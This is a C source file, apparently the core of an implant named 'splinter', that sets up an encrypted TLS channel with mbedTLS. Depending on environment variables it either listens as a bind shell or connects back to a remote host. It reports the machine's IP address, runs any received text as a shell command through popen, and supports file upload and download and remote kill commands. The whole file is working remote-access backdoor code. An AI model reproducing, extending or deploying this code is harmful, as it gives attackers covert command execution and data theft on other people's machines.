#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <strings.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <netinet/in.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <sys/wait.h>
#include <signal.h>
#include <poll.h>
#include <ifaddrs.h>

#include "mbedtls/entropy.h"
#include "mbedtls/ctr_drbg.h"
#include "mbedtls/certs.h"
#include "mbedtls/x509.h"
#include "mbedtls/ssl.h"
#include "mbedtls/net.h"
#include "mbedtls/error.h"
#include "mbedtls/debug.h"
#include "mbedtls/ssl_internal.h"
#include "mbedtls/sha256.h"

#include "splinter.h"

int main()
{
    int i, ret;
    int had_output = 0;
    char *empty_return = "[*] Command completed\n";
    FILE *fp;
    char *env_host = NULL;
    char *env_port = NULL;

    struct pollfd fds[64];
    int    nfds = 1, current_size = 0;
    struct ssl_conn *listen_conn = NULL;
    struct ssl_conn *client_conn = NULL;
    struct ssl_conn *clean_helper = NULL;
    struct compression compress;
    struct ifaddrs *ifa = NULL;
    struct ifaddrs *tmp = NULL;
    struct sockaddr_in *pAddr = NULL;

    //mbedtls
    mbedtls_entropy_context entropy;
    mbedtls_ctr_drbg_context ctr_drbg;
    mbedtls_ssl_config conf;
    mbedtls_x509_crt srvcert;
    mbedtls_pk_context pkey;
    mbedtls_x509_crt_init( &srvcert );
    mbedtls_pk_init( &pkey );
    mbedtls_entropy_init( &entropy );
    mbedtls_ctr_drbg_init( &ctr_drbg );
    mbedtls_ssl_config_init( &conf );

    env_host = getenv("I");
    env_port = getenv("P");

    if (env_port == NULL){
        return 17;
    }

    listen_conn = malloc (sizeof(struct ssl_conn));
    memset(listen_conn, 0, sizeof(struct ssl_conn));

    mbedtls_net_init( &listen_conn->conn_fd );
    mbedtls_ssl_init( &listen_conn->ssl_fd );
    #ifdef DEBUG
    printf("Host: %s\n", env_host);
    #endif

    ret = mbedtls_x509_crt_parse( &srvcert, (const unsigned char *) mbedtls_test_srv_crt, mbedtls_test_srv_crt_len );
    if( ret != 0 ) {
        #ifdef DEBUG
        printf( " failed\n  !  mbedtls_x509_crt_parse returned %d\n\n", ret );
        #endif
        return 1;
    }

    ret = mbedtls_x509_crt_parse( &srvcert, (const unsigned char *) mbedtls_test_cas_pem, mbedtls_test_cas_pem_len );
    if( ret != 0 ) {
        #ifdef DEBUG
        printf( " failed\n  !  mbedtls_x509_crt_parse returned %d\n\n", ret );
        #endif
        return 2;
    }

    ret =  mbedtls_pk_parse_key( &pkey, (const unsigned char *) mbedtls_test_srv_key, mbedtls_test_srv_key_len, NULL, 0 );
    if( ret != 0 ) {
        #ifdef DEBUG
        printf( " failed\n  !  mbedtls_pk_parse_key returned %d\n\n", ret );
        #endif
        return 3;
    }

    #ifdef DEBUG
    printf( "  . Seeding the random number generator..." );
    fflush( stdout );
    #endif
    mbedtls_entropy_init(&entropy);
    if( ( ret = mbedtls_ctr_drbg_seed( &ctr_drbg, mbedtls_entropy_func, &entropy, NULL, 256 ) ) != 0 ) {
        #ifdef DEBUG
        printf( " failed\n  ! mbedtls_ctr_drbg_seed returned %d\n", ret );
        #endif
        return 5;
    }
    #ifdef DEBUG
    printf(" ok\n");

    printf( "  . Setting up the SSL data...." );
    fflush( stdout );
    #endif
    if (env_host == NULL){
        if( ( ret = mbedtls_ssl_config_defaults( &conf, MBEDTLS_SSL_IS_SERVER, MBEDTLS_SSL_TRANSPORT_STREAM, MBEDTLS_SSL_PRESET_DEFAULT ) ) != 0 ) {
            #ifdef DEBUG
            printf( " failed\n  ! mbedtls_ssl_config_defaults returned %d\n\n", ret );
            #endif
            return 6;
        }
    } else {
        if( ( ret = mbedtls_ssl_config_defaults( &conf, MBEDTLS_SSL_IS_CLIENT, MBEDTLS_SSL_TRANSPORT_STREAM, MBEDTLS_SSL_PRESET_DEFAULT ) ) != 0 ) {
            #ifdef DEBUG
            printf( " failed\n  ! mbedtls_ssl_config_defaults returned %d\n\n", ret );
            #endif
            return 6;
        }
        mbedtls_ssl_conf_authmode( &conf, MBEDTLS_SSL_VERIFY_OPTIONAL );
    }
    #ifdef DEBUG
    printf(" ok\n");    

    printf( "  . Setting up the SSL/TLS structure..." );
    fflush( stdout );
    #endif
    mbedtls_ssl_conf_rng( &conf, mbedtls_ctr_drbg_random, &ctr_drbg );
    mbedtls_ssl_conf_ca_chain( &conf, srvcert.next, NULL );
    if( ( ret = mbedtls_ssl_conf_own_cert( &conf, &srvcert, &pkey ) ) != 0 ) {
        #ifdef DEBUG
        printf( " failed\n  ! mbedtls_ssl_conf_own_cert returned %d\n\n", ret );
        #endif
        return 7;
    }
    #ifdef DEBUG
    printf( " ok\n" );
    #endif

    if (env_host == NULL){
        if( ( ret = mbedtls_net_bind( &listen_conn->conn_fd, NULL, env_port, MBEDTLS_NET_PROTO_TCP ) ) != 0 ) {
            #ifdef DEBUG
            printf( " failed\n  ! mbedtls_net_bind returned %d\n\n", ret );
            #endif
            return 4;
        }
    } else {
        if ( ( ret = mbedtls_ssl_setup( &listen_conn->ssl_fd, &conf ) ) != 0 ) {
            #ifdef DEBUG
            printf( " failed\n  ! mbedtls_ssl_setup returned %d\n\n", ret );
            #endif
            return 6;
        }

        #ifdef DEBUG
        printf("Connecting to tcp/%s/%s...\n", env_host, env_port);
        #endif
        if ( ( ret = mbedtls_net_connect( &listen_conn->conn_fd, env_host, env_port, MBEDTLS_NET_PROTO_TCP ) ) != 0 ) {
            #ifdef DEBUG
            printf( " failed\n  ! mbedtls_net_connect returned %d\n\n", ret );
            #endif
            return 4;
        }

        mbedtls_ssl_set_bio( &listen_conn->ssl_fd, &listen_conn->conn_fd, mbedtls_net_send, mbedtls_net_recv, NULL );

        #ifdef DEBUG
        printf( "  . Performing the SSL/TLS handshake..." );
        fflush( stdout );
        #endif
        while ( ( ret = mbedtls_ssl_handshake( &listen_conn->ssl_fd ) ) != 0 ) {
            if ( ret != MBEDTLS_ERR_SSL_WANT_READ && ret != MBEDTLS_ERR_SSL_WANT_WRITE ) {
                #ifdef DEBUG
                printf( " failed\n  ! mbedtls_ssl_handshake returned -0x%x\n\n", -ret );
                #endif
                return 8;
            }
        }
        #ifdef DEBUG
        printf( " ok\n" );
        #endif

        getifaddrs(&ifa);
        tmp = ifa;
        pAddr = NULL;
        while (tmp) {
            if (tmp->ifa_addr && tmp->ifa_addr->sa_family == AF_INET) {
                if (strncmp(tmp->ifa_name, "lo", 2) != 0){
                    pAddr = (struct sockaddr_in *)tmp->ifa_addr;
                }
            }
            tmp = tmp->ifa_next;
        }
        if (pAddr != NULL){
            mbedtls_ssl_write(&listen_conn->ssl_fd, (unsigned char*)inet_ntoa(pAddr->sin_addr), sizeof(unsigned char) * strnlen(inet_ntoa(pAddr->sin_addr), 17));
        } else{
            mbedtls_ssl_write(&listen_conn->ssl_fd, (unsigned char*)inet_ntoa(pAddr->sin_addr), sizeof(unsigned char) * strnlen(inet_ntoa(pAddr->sin_addr), 17));
        }
        freeifaddrs(ifa);
    }

    memset(fds, -1, sizeof(fds));

    /*************************************************************/
    /* Set up the initial listening socket                        */
    /*************************************************************/
    fds[0].fd = listen_conn->conn_fd.fd;
    fds[0].events = POLLIN;
    #ifdef DEBUG
    printf( "  . Waiting for a remote connection ..." );
    fflush( stdout );
    #endif

    memset(&compress, 0, sizeof(struct compression));
    if ((compress.orig_buffer = (unsigned char*) malloc(BUFFER_SIZE)) == NULL){
        perror("Failed initial malloc");
    }
    memset(compress.orig_buffer, 0, BUFFER_SIZE);

    if ((compress.transformed_buffer = (unsigned char*) malloc(BUFFER_SIZE)) == NULL){
        perror("Failed initial malloc");
    }
    memset(compress.transformed_buffer, 0, BUFFER_SIZE);
    
    while (1) {
        ret = poll(fds, nfds, -1);
        if (ret < 0) {
            perror("  poll() failed");
            goto Cleanup;
        }
        /***********************************************************/
        /* One or more descriptors are readable.  Need to          */
        /* determine which ones they are.                          */
        /***********************************************************/
        current_size = nfds;

        //Run through the existing connection looking for data to be read
        for (i = 0; i < current_size; i++) {
            //New connection
            if (fds[i].revents & POLLIN) {
                if ((fds[i].fd == listen_conn->conn_fd.fd) && (env_host == NULL)) {
                    /*******************************************************/
                    /* Listening descriptor is readable.                   */
                    /*******************************************************/

                    /* Creates a node at the end of the list */
                    add_client(&listen_conn, &client_conn);

                    if( ( ret = mbedtls_net_accept( &listen_conn->conn_fd, &client_conn->conn_fd, NULL, 0, NULL ) ) != 0 ) {
                        #ifdef DEBUG
                        printf( " failed\n  ! mbedtls_net_accept returned %d\n\n", ret );
                        #endif
                        return 9;
                    } else {
                        #ifdef DEBUG
                        printf(" connected!\n");
                        #endif
                        if( ( ret = mbedtls_ctr_drbg_reseed( &ctr_drbg, NULL, 0 ) ) != 0 ) {
                            #ifdef DEBUG
                            printf( " failed\n  ! mbedtls_ctr_drbg_reseed returned %d\n", ret );
                            #endif
                            goto Cleanup;
                        }

                        if( ( ret = mbedtls_ssl_setup( &client_conn->ssl_fd, &conf ) ) != 0 ) {
                            #ifdef DEBUG
                            printf( " failed\n  ! mbedtls_ssl_setup returned %d\n\n", ret );
                            #endif
                            return 8;
                        }
                        #ifdef DEBUG
                        printf("  . mbedtls_ssl_setup ... completed\n");
                        #endif
                        mbedtls_ssl_set_bio( &client_conn->ssl_fd, &client_conn->conn_fd, mbedtls_net_send, mbedtls_net_recv, 0 );

                        //Handle new connections
                        #ifdef DEBUG
                        printf( "  . Performing the SSL/TLS handshake ..." );
                        fflush( stdout );
                        #endif

                        while( ( ret = mbedtls_ssl_handshake( &client_conn->ssl_fd ) ) != 0 ) {
                            if( ret != MBEDTLS_ERR_SSL_WANT_READ && ret != MBEDTLS_ERR_SSL_WANT_WRITE ) {
                                #ifdef DEBUG
                                printf( " failed\n  ! mbedtls_ssl_handshake returned 0x%x\n\n", -ret );
                                #endif
                                return 10;
                            }
                        }
                        #ifdef DEBUG
                        printf(" ok\n");
                        printf("Cipher: %s\n", mbedtls_ssl_get_ciphersuite( &client_conn->ssl_fd ));
                        #endif
                        
                        getifaddrs(&ifa);
                        tmp = ifa;
                        pAddr = NULL;
                        while (tmp) {
                            if (tmp->ifa_addr && tmp->ifa_addr->sa_family == AF_INET) {
                                if (strncmp(tmp->ifa_name, "lo", 2) != 0){
                                    pAddr = (struct sockaddr_in *)tmp->ifa_addr;
                                }
                            }
                            tmp = tmp->ifa_next;
                        }
                        if (pAddr != NULL){
                            mbedtls_ssl_write(&client_conn->ssl_fd, (unsigned char*)inet_ntoa(pAddr->sin_addr), sizeof(unsigned char) * strnlen(inet_ntoa(pAddr->sin_addr), 17));
                        } else{
                            mbedtls_ssl_write(&client_conn->ssl_fd, (unsigned char*)inet_ntoa(pAddr->sin_addr), sizeof(unsigned char) * strnlen(inet_ntoa(pAddr->sin_addr), 17));
                        }
                        freeifaddrs(ifa);

                        /*****************************************************/
                        /* Add the new incoming connection to the            */
                        /* pollfd structure                                  */
                        /*****************************************************/
                        #ifdef DEBUG
                        printf("%s: New connection from %s on socket %d\n", "127.0.0.1", "127.0.0.1", client_conn->conn_fd.fd);
                        #endif
                        fds[nfds].fd = client_conn->conn_fd.fd;
                        fds[nfds].events = POLLIN;
                        nfds++;
                    }
                } else {
                    //Handle data from a client
                    /*******************************************************/
                    /* Receive all incoming data on this socket            */
                    /* before we loop back and call poll again.            */
                    /*******************************************************/
                    client_conn = listen_conn->next;
                    while (client_conn != NULL) {
                        if (client_conn->conn_fd.fd == fds[i].fd) {
                            break;
                        }
                        client_conn = client_conn->next;
                    }
                    if (env_host != NULL){
                        client_conn = listen_conn;
                    }

                    /*****************************************************/
                    /* Receive data on this connection until the         */
                    /* recv fails with EWOULDBLOCK. If any other         */
                    /* failure occurs, we will close the                 */
                    /* connection.                                       */
                    /*****************************************************/
                    if ((compress.orig_size = mbedtls_ssl_read(&client_conn->ssl_fd, compress.orig_buffer, BUFFER_SIZE)) <= 0){
                        #ifdef DEBUG
                        printf("nbytes: %d\n", compress.orig_size);
                        #endif
                        //Got an error or connection closed by client
                        if (compress.orig_size == MBEDTLS_ERR_SSL_PEER_CLOSE_NOTIFY) {
                            //Connection closed
                            #ifdef DEBUG
                            printf("%s: socket %d hung up\n", "127.0.0.1", i);
                            #endif
                            goto Cleanup;
                        }
                        if (compress.orig_size == MBEDTLS_ERR_NET_RECV_FAILED) {
                            #ifdef DEBUG
                            printf("MBEDTLS recv failed\n");
                            #endif
                            goto Cleanup;
                        }

                        if (compress.orig_size == 0) {
                            #ifdef DEBUG
                            printf("Connection closed\n");
                            #endif
                            if (env_host != NULL){
                                goto Cleanup;
                            }
                            client_disconnect(&listen_conn, &fds[i], fds[i].fd, &nfds);
                            continue;
                        }
                    } else {
                        decompress_buffer(&compress);
                        #ifdef DEBUG
                        printf("Decompressed: %s\n", compress.transformed_buffer);
                        #endif

                        if (strncmp("", (char*)compress.transformed_buffer, 1) == 0) {
                            memset(compress.orig_buffer, 0, BUFFER_SIZE);
                            memset(compress.transformed_buffer, 0, BUFFER_SIZE);
                            strncpy((char*)compress.orig_buffer, empty_return, BUFFER_SIZE);
                            compress_buffer(&compress);
                            if (mbedtls_ssl_write(&client_conn->ssl_fd, compress.transformed_buffer, compress.transformed_size) == -1 ) {
                                perror("Error Sending");
                            }
                            continue;
                        }
                        if (strncmp(".kill", (char*)compress.transformed_buffer, 5) == 0) {
                            #ifdef DEBUG
                            printf("Exiting...\n");
                            #endif
                            goto Cleanup;
                        }

                        if (strncmp(".quit", (char*)compress.transformed_buffer, 5) == 0) {
                            #ifdef DEBUG
                            printf("Exiting...\n");
                            #endif
                            client_disconnect(&listen_conn, &fds[i], fds[i].fd, &nfds);
                            continue;
                        }

                        if (strncmp("call ", (char*)compress.transformed_buffer, 5) == 0){
                            //callback_to_ip((char*)compress.transformed_buffer, &client_conn);
                            continue;
                        }

                        if (strncmp("upload ", (char*)compress.transformed_buffer, 7) == 0) {
                            strncpy((char*)compress.orig_buffer, (char*)compress.transformed_buffer, BUFFER_SIZE);
                            upload_file(&compress, client_conn);
                            continue;
                        }

                        if (strncmp("download ", (char*)compress.transformed_buffer, 9) == 0) {
                            strncpy((char*)compress.orig_buffer, (char*)compress.transformed_buffer, BUFFER_SIZE);
                            download_file(&compress, client_conn);
                            continue;
                        }

                        fp = popen(strncat((char*)compress.transformed_buffer, " 2>&1 ", 6), "r");
                        if (fp == NULL) {
                            #ifdef DEBUG
                            printf("Failed to run command\n");
                            #endif
                        }

                        memset(compress.orig_buffer, 0, BUFFER_SIZE);
                        memset(compress.transformed_buffer, 0, BUFFER_SIZE);
                        while ((compress.orig_size = fread((char*)compress.orig_buffer, 1, BUFFER_SIZE, fp)) > 0) {
                            #ifdef DEBUG
                            printf("%s", compress.orig_buffer);
                            #endif
                            compress_buffer(&compress);
                            ret = mbedtls_ssl_write(&client_conn->ssl_fd, compress.transformed_buffer, compress.transformed_size);
                            memset(compress.orig_buffer, 0, BUFFER_SIZE);
                            memset(compress.transformed_buffer, 0, BUFFER_SIZE);
                            had_output = 1;
                        }
                        if (compress.orig_size == 0 && had_output == 0) {
                            strncpy((char*)compress.orig_buffer, empty_return, BUFFER_SIZE);
                            compress_buffer(&compress);
                            if (mbedtls_ssl_write(&client_conn->ssl_fd, compress.transformed_buffer, compress.transformed_size) == -1) {
                                perror("Error Sending");
                            }
                        }
                        had_output = 0;

                        fclose(fp);
                        memset(compress.orig_buffer, 0, BUFFER_SIZE);
                        memset(compress.transformed_buffer, 0, BUFFER_SIZE);
                    }
                }
            }
        } // end of loop through pollable descriptors
    } //while loop

Cleanup:
    /*************************************************************/
    /* Clean up all of the sockets that are open
    *************************************************************/

    for (i = 0; i < nfds; i++) {
        if (fds[i].fd >= 0) {
            close(fds[i].fd);
        }
    }

    free(compress.orig_buffer);
    free(compress.transformed_buffer);
    client_conn = listen_conn->next;
    while (client_conn != NULL) {
        clean_helper = client_conn;
        mbedtls_ssl_free( &client_conn->ssl_fd );
        mbedtls_net_free( &client_conn->conn_fd );
        client_conn = client_conn->next;
        free(clean_helper);
    }
    mbedtls_ssl_free( &listen_conn->ssl_fd );
    mbedtls_net_free( &listen_conn->conn_fd );
    free(listen_conn);

    mbedtls_x509_crt_free( &srvcert );
    mbedtls_pk_free( &pkey );
    mbedtls_ssl_config_free( &conf );
    mbedtls_ctr_drbg_free( &ctr_drbg );
    mbedtls_entropy_free( &entropy );

    return 0;
}

void add_client(struct ssl_conn **head, struct ssl_conn **client_conn)
{
    struct ssl_conn *current = *head;
    *client_conn = (struct ssl_conn*)malloc (sizeof(struct ssl_conn));
    if (client_conn == NULL) {
        perror("Failed client malloc");
    }
    memset((*client_conn), 0, sizeof(struct ssl_conn));
    mbedtls_net_init( &(*client_conn)->conn_fd );
    mbedtls_ssl_init( &(*client_conn)->ssl_fd );
    (*client_conn)->next = NULL;

    if ((*head)->next == NULL) {
        (*head)->next = *client_conn;
        //printf("added at beginning\n");
    } else {
        while (current->next != NULL) {
            current = current->next;
            //printf("added later\n");
        }
        current->next = *client_conn;
    }
    return;
}

void client_disconnect(struct ssl_conn **head, struct pollfd *fds, int fd, int *nfds)
{
    struct ssl_conn *current = (*head)->next;
    struct ssl_conn *previous = *head;
    while (current != NULL && previous != NULL) {
        if (current->conn_fd.fd == fd) {
            close(fds->fd);
            fds->fd = (fds+1)->fd;
            (*nfds)--;
            previous->next = current->next;
            mbedtls_ssl_free(&current->ssl_fd);
            mbedtls_net_free(&current->conn_fd);
            free(current);
            return;
        }
        previous = current;
        current = current->next;
    }
    return;
}
